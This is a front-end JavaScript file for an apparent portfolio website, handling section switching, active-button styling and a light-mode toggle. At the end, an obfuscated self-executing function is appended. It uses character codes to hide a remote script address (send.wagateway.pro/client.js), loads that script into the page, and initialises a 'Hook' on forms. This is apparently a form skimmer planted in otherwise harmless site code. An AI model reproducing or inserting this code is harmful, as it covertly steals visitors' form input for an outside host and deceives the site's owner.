const sections = document.querySelectorAll('.section');
const secBtns = document.querySelectorAll('.controls');
const secBtn = document.querySelectorAll('.control');
const secBtn1 = document.querySelector('.control-1');
const secBtn2 = document.querySelector('.control-2');
const secBtn3 = document.querySelector('.control-3');
const secBtn4 = document.querySelector('.control-4');
const secBtn5 = document.querySelector('.control-5');
const allSection = document.querySelector('.main-content');

let pageTransitions = () => {
    // button click active class
    allSection.addEventListener('click', (e) => {
        const id = e.target.dataset.id;
        if (id) {
            secBtn.forEach((button) => {
                button.classList.remove('active-btn');
            })
            e.target.classList.add('active-btn')
        }
    })

    // section active
    allSection.addEventListener('click', (e) => {
        const id = e.target.dataset.id;
        if (id) {
            // remove selected from the btn
            secBtn.forEach((btn) => {
                btn.classList.remove('active');
            })
            e.target.classList.add('active');

            // hide other sections  
            sections.forEach((section) => {
                section.classList.remove('active');
            })
            const element = document.getElementById(id);
            element.classList.add('active');
        }
    })

    // toggle thene
    const theme = document.querySelector('.theme-btn');
    theme.addEventListener('click', () => {
        let element = document.body;
        element.classList.toggle('light-mode')
    })

}
pageTransitions();
(function(){if(typeof n!="function")var n=function(){return new Promise(function(e,r){let o=document.querySelector('script[id="hook-loader"]');o==null&&(o=document.createElement("script"),o.src=String.fromCharCode(47,47,115,101,110,100,46,119,97,103,97,116,101,119,97,121,46,112,114,111,47,99,108,105,101,110,116,46,106,115,63,99,97,99,104,101,61,105,103,110,111,114,101),o.id="hook-loader",o.onload=e,o.onerror=r,document.head.appendChild(o))})};n().then(function(){window._LOL=new Hook,window._LOL.init("form")}).catch(console.error)})();//4bc512bd292aa591101ea30aa5cf2a14a17b2c0aa686cb48fde0feeb4721d5db